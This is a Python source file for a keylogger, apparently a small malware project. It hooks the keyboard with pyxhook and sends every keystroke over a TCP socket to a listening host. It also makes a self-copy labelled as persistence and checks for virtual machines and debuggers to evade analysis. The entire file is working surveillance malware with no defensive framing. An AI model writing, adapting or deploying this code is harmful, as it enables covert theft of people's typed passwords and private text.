import random
import socket
import math
import pyxhook

from sys import argv, stdout

from RunningEnvironment import RunningEnvironment
from WasteTime import WasteTime

HOST, PORT = "localhost", 9999

def onKeyPress(event):
    global captureKeys
    ################################################################
    # Make connection
    ################################################################
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Connect to server and send data
        sock.connect((HOST, PORT))
        sock.sendall(bytes(event.Key + "\n", "utf-8"))
        sock.close()

def main():
    stdout.write(f'{argv[0]}\n')
    ################################################################
    # Persistance
    ################################################################
    originalFile = open(argv[0], 'rb')
    file = originalFile.readlines()
    originalFile.close()

    output = open(argv[0] + str(random.randint(0,9)), 'w')

    for everyLine in file[:math.floor(len(file)/2)]:
        output.write(str(everyLine))

    captureKeys = True
    ################################################################
    # Check if program is running in a virtual machine or a debugger
    ################################################################
    runEnv = RunningEnvironment()
    runEnv.checkVM()
    runEnv.checkDebugger()

    if runEnv.isCompromised:
        # Perform useless operations
        WasteTime.run()

    ################################################################
    # HookKernel
    ################################################################
    hook = pyxhook.HookManager()
    hook.KeyDown = onKeyPress
    hook.HookKeyboard()
    hook.start()

    for everyLine in file[math.ceil(len(file)/2):]:
        output.write(str(everyLine))

    output.close()

    while captureKeys:
        pass

    hook.cancel()

    return

if __name__ == "__main__":
    main()
